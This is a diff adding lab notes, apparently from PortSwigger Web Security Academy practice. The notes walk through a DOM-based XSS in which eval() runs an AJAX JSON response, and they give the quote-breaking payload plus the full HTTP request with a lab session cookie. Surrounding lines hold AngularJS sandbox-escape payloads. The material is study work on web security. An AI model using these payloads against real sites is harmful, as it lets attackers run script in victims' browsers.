@@ -503,6 +503,66 @@ The function passed to the controller has a $scope parameter, which is the appli
 
 Therefore
 You can use both {{$on.constructor('alert(1)')()}} or {{$eval.constructor('alert(1)')()}} > to get alert() message.
+_______________________________________________________________________________________________________________________________________________________________________________________________
+Dom based XSS (without having Dom manipulation)
+------------------------------------------------
+
+
+Below code is seen in > Network  > searchresult.js
+
+function search(path) {
+    var xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function() {
+        if (this.readyState == 4 && this.status == 200) {
+            eval('var searchResultsObj = ' + this.responseText);
+
+
+if (this.readyState == 4 && this.status == 200) > webpage will display the responseText
+
+
+That is called AJAX 
+
+An AJAX (Asynchronous JavaScript and XML) HTTP request is a method used in web development to send and receive data from a server asynchronously 
+without reloading the entire web page.
+
+
+
+It respond with JSON
+--------------------
+
+HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 37
+{"results":[],"searchTerm":"test"}
+
+
+You have to break the text and comment the rest
+------------------------------------------------
+In JSON it will break the double quote with (\) > hello" > the response will be > {"results":[],"searchTerm":"hello\""}
+
+This is the payload > hello\"+alert(1)}//
+
+
+HTTP request
+------------
+GET /search-results?search=hello\"+alert(1)}// HTTP/2
+Host: 0a4500ef038485b782a079e700bb000e.web-security-academy.net
+Cookie: session=8hnxKkXJH7kfc3saPErPkpMdgTmN06qg
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a4500ef038485b782a079e700bb000e.web-security-academy.net/?search=fuckyou
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+_______________________________________________________________________________________________________________________________________________________________________________________________
+
+
+
+
 
 
 
